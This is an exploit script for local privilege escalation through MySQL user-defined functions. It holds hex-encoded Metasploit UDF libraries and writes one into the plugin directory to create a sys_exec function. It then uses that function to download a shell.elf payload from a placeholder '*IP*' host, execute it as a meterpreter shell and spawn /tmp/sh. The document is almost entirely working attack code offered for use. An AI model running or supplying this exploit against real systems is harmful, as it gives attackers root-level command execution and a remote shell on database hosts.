# Exploit Title: MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit
# Date: 24/01/2019
# Exploit Author: d7x
# Vendor Homepage: https://www.mysql.com
# Software Link: www.mysql.com
# Version: MySQL 4.x/5.x
# Tested on: Debian GNU/Linux 8.11 / mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3
# CVE : N/A

'''
*** MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit ***


UDF lib shellcodes retrieved from metasploit
(there are windows .dll libraries within metasploit as well so this could be easily ported to Windows)

Based on the famous raptor_udf.c by Marco Ivaldi (EDB ID: 1518)
CVE: N/A
References:
https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html
https://www.exploit-db.com/exploits/1518
https://www.exploit-db.com/papers/44139/ - MySQL UDF Exploitation by Osanda Malith Jayathissa (@OsandaMalith)

Tested on 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux

@d7x_real
https://d7x.promiselabs.net
https://www.promiselabs.net
'''


import sys
import subprocess
import platform, random
import argparse
import os
import re
import pty

shellcode_x32 = "7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000";
shellcode_x64 = "7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000";

shellcode = shellcode_x32
if (platform.architecture()[0] == '64bit'):
 shellcode = shellcode_x64

# MySQL username and password: make sure you have FILE privileges and mysql is actually running as root
# username='root'
# password=''

###
#if len(sys.argv) != 2:
#	print "Usage: %s <username> <password>" % argv[0]

#username=sys.argv[1];
#password=sys.argv[2];
###

parser = argparse.ArgumentParser()
parser.add_argument('--username', '-u', help='MySQL username', type=str, required=True)
parser.add_argument('--password', '-p', help='MySQL password', type=str)

args = parser.parse_args()

username=args.username
password=args.password	

if not password:
	password='*PASSWORD*'
	
cmd='mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "select @@plugin_dir \G"'
plugin_str = subprocess.check_output(cmd, shell=True)
plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
res = bool(plugin_dir)

if not res:
 print "Error: could not locate the plugin directory"
 os.exit(1);
	
plugin_dir_ = plugin_dir.group(1)

print "Plugin dir is %s" % plugin_dir_

# file to save the udf so file to
udf_filename = 'udf' + str(random.randint(1000,10000)) + '.so'
udf_outfile = plugin_dir_ + udf_filename

# alternative way:
# set @outputpath := @@plugin_dir; set @outputpath := @@plugin_dir;
#mysql --host=127.0.0.1 --port 13306 -u root --port 13306 -pBmDu9xUHKe3fZi3Z7RdMBeb
print "Trying to create a udf library...";
os.system('mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
res = os.path.isfile(udf_outfile)

if not res:
 print "Error: could not create udf file in %s (mysql is either not running as root or may be file exists?)" % udf_outfile

print "UDF library crated successfully: %s" % udf_outfile;
print "Trying to create sys_exec..."
os.system('mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)

print "Checking if sys_exec was crated..."
cmd='mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "select * from mysql.func where name=\'sys_exec\' \G"';
res = subprocess.check_output(cmd, shell=True);


if (res == ''):
	print "sys_exec was not found (good luck next time!)"

if res:
	print "sys_exec was found: %s" % res
	print "Getting meterpreter shell"
	
	os.system('mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "select sys_exec(\'wget http://*IP*/shell.elf\')"')

	os.system('mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "select sys_exec(\'chmod +x ./shell.elf\')"')

	os.system('mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "select sys_exec(\'./shell.elf\')"')	
	
	pty.spawn("/tmp/sh");
